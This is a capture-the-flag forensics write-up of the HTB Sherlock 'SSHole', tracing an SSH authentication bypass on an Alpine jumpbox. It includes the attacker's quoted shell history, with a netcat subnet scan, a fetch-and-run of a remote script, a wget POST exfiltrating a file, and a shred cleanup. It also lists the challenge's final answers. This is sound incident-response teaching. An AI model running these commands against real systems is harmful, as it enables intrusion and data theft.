# HTB Sherlock — “SSHole” (DFIR)

**Category:** DFIR / Sherlock  
**Difficulty:** Very Easy

---

## Scenario

> Suspicious traffic was observed from a misconfigured jumpbox to a suspicious domain. Evidence was pulled from the jumpbox server. The goal is to determine how the attackers gained access to the server and what they did afterwards.

The evidence is a single archive, `SSHole.zip`, containing a collection of files copied from the compromised host. The archive is password-protected with the usual Sherlock password, `hacktheblue`.

```bash
unzip -P hacktheblue SSHole.zip
```

Once extracted, the collection mirrors the server’s file system (274 files):

```text
SSHole/
├── etc/              System configuration (OS, SSH, users, shadow, doas, cron)
├── var/log/          messages, apk.log, dmesg, wtmp (empty)
├── var/run/          utmp (empty), pid files, OpenRC state
├── home/adminsvc/    .ash_history, scanreport.txt, SSH keys
└── root/             .ash_history
```

---

## Tooling

- `cat`, `grep`, `awk` — to read configuration files and filter `var/log/messages`
- A web search engine — the vulnerability was disclosed days before this analysis, so the CVE had to be identified from the vendor advisory
- MITRE ATT&CK — to map the observed behaviour to techniques

---

## Recon: A Different Kind of Evidence

Unlike a single log file, this is a **triage collection**, so the first step is to understand what kind of system it is. The server is Alpine Linux, which differs from Debian/Ubuntu in several ways that matter for the investigation:

| Topic | Debian / Ubuntu | Alpine Linux |
|---|---|---|
| Authentication log | `/var/log/auth.log` | `/var/log/messages` |
| Privilege escalation | `sudo` | `doas` (`/etc/doas.conf`) |
| Default shell | `bash` (`.bash_history`) | BusyBox `ash` (`.ash_history`) |
| Package manager | `apt` (`/var/log/dpkg.log`) | `apk` (`/var/log/apk.log`, `/etc/apk/world`) |
| C library | glibc | **musl** |

The last row turns out to be the key to the whole case.

Two limits of the evidence are worth noting from the start:

- `var/log/wtmp` and `var/run/utmp` are both **0 bytes**, so login records cannot be cross-checked against a second artifact.
- The `.ash_history` files contain **no timestamps**, so commands can be ordered but not dated.

---

## Task 1 — Operating system

Distributions identify themselves in standard files under `/etc`:

```bash
cat etc/os-release
cat etc/alpine-release
```

| File | Content |
|---|---|
| `etc/os-release` | `NAME="Alpine Linux"`, `VERSION_ID=3.24.3`, `PRETTY_NAME="Alpine Linux v3.24"` |
| `etc/alpine-release` | `3.24.3` |
| `etc/issue` | `Welcome to Alpine Linux 3.24` |
| `etc/hostname` | `dev-jumpbox` |

`VERSION_ID` gives the full version. The installed package list (`etc/apk/world`) is short: `alpine-base`, `busybox-mdev-openrc`, `doas`, `openssh`, `openssl`. A jumpbox running OpenSSH on musl is the starting hypothesis for what follows.

**Answer:** `Alpine Linux 3.24.3`

---

## Task 2 — Vulnerability abused

`var/log/apk.log` does not reveal the OpenSSH version, and `sshd_config` shows `PasswordAuthentication yes` and `PermitRootLogin yes`, but no CVE can be read from the evidence alone. The pieces that matter are:

- the OS and version (Alpine 3.24.3);
- the exposed service (OpenSSH, built without PAM on Alpine);
- the log pattern in `var/log/messages` (Task 3).

The challenge name and the release date point to a vulnerability disclosed on **5 November 2026**, the day before the activity in the logs. According to the Alpine advisory and public write-ups, it is an authentication bypass in `sshd` on musl-based systems without PAM, nicknamed *sshole*, tracked as **CVE-2026-123158**. Alpine 3.24.3 is affected, and the fix ships in 3.24.4.

**Answer:** `CVE-2026-123158`

---

## Task 3 — Time of exploitation

Successful SSH logins are recorded by `sshd-session`:

```bash
grep "Accepted password for adminsvc" var/log/messages
```

```text
Nov  6 11:27:05 dev-jumpbox auth.info sshd-session[4852]: Failed password for adminsvc from 192.168.72.1 port 61351 ssh2
Nov  6 11:27:08 dev-jumpbox auth.info sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2
```

Two checks are needed before submitting:

- **Timezone.** The log does not state one. `etc/localtime` is a TZif file whose POSIX rule is `UTC0`, so the timestamps are already in UTC.
- **Year.** Syslog lines have none. `var/log/apk.log` contains full dates (`2026-11-06`).

The failure and the success share the same source port (`61351`), meaning the same TCP connection: a first attempt fails, then a following attempt succeeds. That fits public analysis of the bug, which reports that the bypass only works on a second or later attempt within a connection.

**Answer:** `2026-11-06 11:27:08`

---

## Task 4 — Account abused

The account is in the log line above. `/etc/shadow` shows why this account, and only this one, could be abused:

```text
root:$6$f4XOlG/We5wpezjh$Bep5mZyr...:20763:0:::::
bin:!::0:::::
daemon:!::0:::::
  ... (all other system accounts: !)
adminsvc:*:20763:0:99999:7:::
```

| Account type | Shadow field | Meaning |
|---|---|---|
| `root` | `$6$...` | Real SHA-512 hash, supplies the salt |
| System accounts | `!` | Locked, no password can be accepted |
| **`adminsvc`** | **`*`** | **No password set** (key-only account) |

`adminsvc` is the only account with `*`, and it is a real login account (`/bin/sh`, `/home/adminsvc`). It is also in the `wheel` group, which `doas.conf` permits to use `doas`. `root` is the first account in `/etc/passwd` and has a `$6$` hash, which matches the conditions described for the vulnerability. `PermitRootLogin yes` is set, but `root` has a real password, so it was not the target.

**Answer:** `adminsvc`

---

## Task 5 — The string that causes the bypass

When `sshd` is built without PAM, it verifies a password by calling `crypt()` and comparing the result with the stored shadow field. Public write-ups describe the flaw as follows:

1. If the password is longer than 256 bytes, musl’s `crypt()` does not return a hash but the error value `*`.
2. For an account with no password, the shadow field is also `*`.
3. `sshd` compares the two strings, finds them identical, and accepts the login.

```text
crypt(<password of 257+ bytes>, <salt borrowed from root>)  →  "*"   (error value)
/etc/shadow field of adminsvc                               →  "*"   (no password)
"*" == "*"                                                  →  authentication succeeds
```

The trigger is an over-long password (reported range: 257 to 1024 bytes). The string value that makes the comparison succeed is the asterisk.

**Answer:** `*`

---

## Task 6 — Network scan from the jumpbox

Commands typed by `adminsvc` are in `home/adminsvc/.ash_history`:

```text
 1  ls -la
 2  for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
 3  vi scanreport.txt
 4  cat scanreport.txt
 5  bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)
 6  ls -la /tmp
 7  ls -l /tmp/.devenv
 8  wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
 9  shred -u /tmp/.devenv
10  exit
```

Line 2 is the scan. It uses `nc` (netcat) in a loop over a `/24` network:

| Part | Meaning |
|---|---|
| `for ip in {1..254}` | Iterates over every host `192.168.18.1` to `192.168.18.254` |
| `nc -z` | Scan only, send no data |
| `-v` | Verbose, prints which ports succeeded |
| `-w 1` | One-second timeout per port |
| `1-65535` | Every TCP port |
| `2>&1 \| grep -E "succeeded\|open"` | Keeps only the lines for open ports |

The results were saved in `scanreport.txt`:

```text
192.168.18.5  443 445 3389
192.168.18.23 88 139 445 3389 6801 54321
```

The open ports (SMB, RDP, Kerberos) are typical of Windows hosts, though the evidence does not name the systems. The administrator’s own history in `root/.ash_history` shows the jumpbox is routinely used to reach `192.168.18.x` hosts, which explains why that range was reachable and worth scanning.

**Answer:** `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done`

---

## Task 7 — Exfiltration URI

After the scan, the attacker ran a remote script, inspected `/tmp`, and found a hidden file, `/tmp/.devenv`. The file was then sent to a remote server with `wget`:

```text
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
```

`--post-file` makes `wget` send the file contents in the body of an HTTP POST request. The attacker then ran `shred -u /tmp/.devenv`, which overwrites and removes the file to hinder recovery.

The content of `.devenv` is not in the evidence. The history order suggests it was produced by the downloaded `setup.sh`, but the script itself was not collected, so this remains an inference.

**Answer:** `https://devv.coding.eu/process`

---

## Attack Timeline (UTC, 2026-11-06)

| Time | Event |
|---|---|
| 06:16:49 | `openssh` installed via `apk`; `sshd` starts listening on port 22 |
| 11:27:05 | `Failed password` for `adminsvc` from `192.168.72.1` |
| 11:27:08 | `Accepted password` for `adminsvc`, same connection: **CVE-2026-123158 exploited** |
| 11:27:08 – 12:20:02 | Attacker session (commands undated, ordered by `.ash_history`) |
| – | `nc` scan of `192.168.18.0/24`, results saved to `scanreport.txt` |
| – | Remote script `setup.sh` downloaded and executed with `bash` |
| – | `/tmp/.devenv` POSTed to `https://devv.coding.eu/process` |
| – | `/tmp/.devenv` destroyed with `shred -u` |
| 12:20:02 | `adminsvc` session ends (`disconnected by user`) |

Other `root` logins from `192.168.72.131` appear before and after the exploit. They are consistent with the administrator’s own work, as shown by `root/.ash_history` (`setup-alpine`, `apk add`, `ssh-copy-id`, `kubectl`...), and are not part of the attacker’s command history.

---

## Indicators of Compromise

| Type | Value |
|---|---|
| Source IP of the `adminsvc` login | `192.168.72.1` |
| Account abused | `adminsvc` |
| Exfiltration URL | `https://devv.coding.eu/process` |
| Exfiltration domain | `devv.coding.eu` |
| Remote script | `https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh` |
| Staging file | `/tmp/.devenv` (deleted with `shred`) |
| Scan output | `/home/adminsvc/scanreport.txt` |

---

## Mapping to MITRE ATT&CK

| Observed behaviour | Technique |
|---|---|
| Abuse of the `sshd` authentication bypass | T1190 — Exploit Public-Facing Application |
| Login as `adminsvc` without its password | T1078.003 — Valid Accounts: Local Accounts |
| `nc` port scan of `192.168.18.0/24` | T1046 — Network Service Discovery |
| `wget` of `setup.sh` | T1105 — Ingress Tool Transfer |
| `bash <(wget ...)` | T1059.004 — Command and Scripting Interpreter: Unix Shell |
| Hidden file `/tmp/.devenv` | T1564.001 — Hide Artifacts: Hidden Files and Directories |
| `wget --post-file` over HTTPS | T1048.002 — Exfiltration Over Asymmetric Encrypted Non-C2 Protocol |
| `shred -u /tmp/.devenv` | T1070.004 — Indicator Removal: File Deletion |

---

## Final Answers

| Task | Answer |
|---|---|
| 1 | `Alpine Linux 3.24.3` |
| 2 | `CVE-2026-123158` |
| 3 | `2026-11-06 11:27:08` |
| 4 | `adminsvc` |
| 5 | `*` |
| 6 | `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 \| grep -E "succeeded\|open"; done` |
| 7 | `https://devv.coding.eu/process` |

---

## Takeaways

- A collection of files is investigated by first identifying the system. Alpine uses `/var/log/messages`, `doas`, `ash` and `musl`, and each of those changes where evidence lives.
- A recent CVE may not be known to the analyst. The method stays the same: OS and version, exposed service, behaviour in the logs, then the vendor advisory.
- `*` and `!` in `/etc/shadow` are not equivalent. `!` means locked, `*` means no password. Key-only accounts with `*` were the exposed ones here.
- A `Failed password` followed seconds later by `Accepted password` on the same source port can indicate a bypass rather than a guessed password. It deserves a second look in any SSH log.
- Missing artifacts are findings too. Empty `wtmp`/`utmp` files and a history without timestamps limit what can be proven, and a report should say so.
- Shell history is high-value evidence. One file showed the scan, the remote script, the exfiltration and the cleanup.
- Defensive takeaways: upgrade to Alpine 3.24.4 (or a release with the OpenSSH 10.6p2 fix) and restart `sshd`, because upgrading the package does not replace the running daemon; set `PasswordAuthentication no`; restrict outbound traffic from jumpboxes; alert on `nc`, `wget --post-file`, and `bash <(wget ...)`; and forward logs off-host so `shred` and history edits cannot erase the trail.

---

## References

- Hack The Box — Sherlock “SSHole”: https://app.hackthebox.com/sherlocks/SSHole
- Alpine Linux security advisory — openssh-server password authentication bypass (5 Nov 2026): https://alpinelinux.org/posts/2026-11-05-openssh-password-authentication-bypass/
- Ethiack — CVE-2026-123158 (sshole): https://ethiack.com/info-hub/research/sshole-cve-2026-123158
- Detectify — OpenSSH authentication bypass on Alpine Linux (CVE-2026-123158): https://blog.detectify.com/product-updates/critical-vulnerability-openssh-authentication-bypass-on-alpine-linux/
- SOC Prime — CVE-2026-123158 analysis: https://socprime.com/blog/cve-2026-123158-openssh-password-authentication-bypass-affects-alpine-linux/
- Threat Defence — Alpine OpenSSH CVE-2026-123158: Patching and Hunting: https://threatdefence.com/article/alpine-openssh-cve-2026-123158-sshole-patching-hunting
- MITRE ATT&CK T1190 — Exploit Public-Facing Application: https://attack.mitre.org/techniques/T1190/
- MITRE ATT&CK T1078.003 — Valid Accounts: Local Accounts: https://attack.mitre.org/techniques/T1078/003/
- MITRE ATT&CK T1046 — Network Service Discovery: https://attack.mitre.org/techniques/T1046/
- MITRE ATT&CK T1105 — Ingress Tool Transfer: https://attack.mitre.org/techniques/T1105/
- MITRE ATT&CK T1059.004 — Unix Shell: https://attack.mitre.org/techniques/T1059/004/
- MITRE ATT&CK T1564.001 — Hidden Files and Directories: https://attack.mitre.org/techniques/T1564/001/
- MITRE ATT&CK T1048.002 — Exfiltration Over Asymmetric Encrypted Non-C2 Protocol: https://attack.mitre.org/techniques/T1048/002/
- MITRE ATT&CK T1070.004 — Indicator Removal: File Deletion: https://attack.mitre.org/techniques/T1070/004/
